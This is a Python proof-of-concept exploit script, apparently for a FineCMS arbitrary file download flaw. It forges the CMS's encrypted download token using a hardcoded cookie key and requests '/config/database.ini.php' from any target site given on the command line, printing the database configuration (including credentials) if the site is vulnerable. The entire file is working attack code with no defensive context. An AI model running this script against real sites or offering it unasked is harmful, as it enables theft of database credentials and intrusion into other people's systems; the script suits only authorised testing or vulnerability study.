#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import urllib3
import sys
import json
import re
import hashlib
import base64
import requests

from phpserialize import unserialize, serialize

SITE_MEMBER_COOKIE = "2967e68d382902a"
ckey_length = 4


def get_md5(info):
    hl = hashlib.md5()
    hl.update(info.encode())
    return hl.hexdigest()

def base64decode(origStr):
    if(len(origStr) % 3 == 1): 
        origStr = origStr + "=="
    elif(len(origStr) % 3 == 2): 
        origStr = origStr + "=" 
    dStr = base64.b64decode(origStr)
    return dStr

def get_keyinfo():
    key = get_md5(SITE_MEMBER_COOKIE)
    keya = get_md5(key[:16])
    keyb = get_md5(key[16:32])
    return keya, keyb 

def xor_info(datastrlist, cryptkey):
    datastr_length = len(datastrlist)
    box = list(range(256))
    key_length = len(cryptkey)
    rndkey = []
    for i in range(256):
        rndkey.append(ord(cryptkey[i % key_length]))

    j = 0
    for i in range(256):
        j = (j + box[i] + rndkey[i]) % 256
        box[i], box[j] = box[j], box[i]

    byte_result = bytearray(datastr_length)
    #print(box)
    a = j = 0
    for i in range(datastr_length):
        a = (a + 1) % 256
        j = (j + box[a]) % 256
        box[a], box[j] = box[j], box[a]
        t = datastrlist[i] ^ (box[(box[a] + box[j]) % 256])
        byte_result[i] = t
    return byte_result



def dz_decode(datastr):
    datastring = base64decode(datastr).decode()
    keya, keyb = get_keyinfo()
    keyc = datastring[:ckey_length]  
    #print(keyc)
    cryptkey = keya + get_md5(keya + keyc)
    datastring_decode = base64decode(datastring[ckey_length:])
    result = xor_info(datastring_decode, cryptkey)
    #print(result)
    return unserialize(result.decode()[26:].encode())

def dz_encode(data_dict):
    datastring = serialize(data_dict)
    keya, keyb = get_keyinfo()
    keyc = "4805"
    cryptkey = keya + get_md5(keya + keyc)
    verify_code = get_md5(datastring.decode() + keyb)[:16]
    datastring_info = b"0000000000" + verify_code.encode() + datastring
    datastring_encode_byte = xor_info(datastring_info, cryptkey)
    
    einfo = keyc + base64.b64encode(datastring_encode_byte).decode()
    #print(datastring_info, datastring_encode_byte, len(datastring_encode_byte), einfo)
    return base64.b64encode(einfo.encode()).decode().replace("=", "")

def verify(site):
    data = {b'finecms': b'/config/database.ini.php'}
    payload = dz_encode(data)
    burp0_url = site + "/index.php?c=api&a=down&file=" + payload
    #print(burp0_url)
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept-Encoding": "gzip"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if "IN_FINECMS" in r.text:
        return r.text
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，下载 /config/database.ini.php 的内容为：", info)
    else:
        print("[-]漏洞不存在")


